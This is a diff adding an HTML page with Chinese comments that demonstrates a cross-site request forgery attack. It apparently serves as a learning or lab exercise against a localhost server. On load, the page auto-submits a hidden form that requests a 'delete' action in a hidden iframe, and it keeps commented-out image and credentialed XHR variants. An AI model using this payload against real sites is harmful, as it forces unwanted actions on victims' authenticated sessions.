@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <!-- 静态方式 -->
+  <!-- <img src="http://localhost:3000/read" alt="CSRF Attack" style="display:none;"> -->
+  <!-- GET 请求的表单 -->
+
+  <!-- 创建隐藏的 iframe -->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <form id="csrfForm" action="http://localhost:3000/read" method="GET" style="display:none;" target="hiddenFrame">
+    <input type="text" name="action" value="delete">
+    <input type="text" name="id" value="123">
+  </form>
+
+
+  <script>
+    window.onload = () => {
+      document.getElementById('csrfForm').submit();
+      console.log('CSRF 表单已提交，页面不会跳转');
+    };
+  </script>
+  <script>
+    /* const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://localhost:3000/read', true);
+    xhr.onreadystatechange = () => {
+      if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+          console.log(xhr.response);
+        }
+      }
+    }
+    // 携带cookie
+    xhr.withCredentials = true;
+    xhr.send(); */
+  </script>
+</body>
+
+</html>
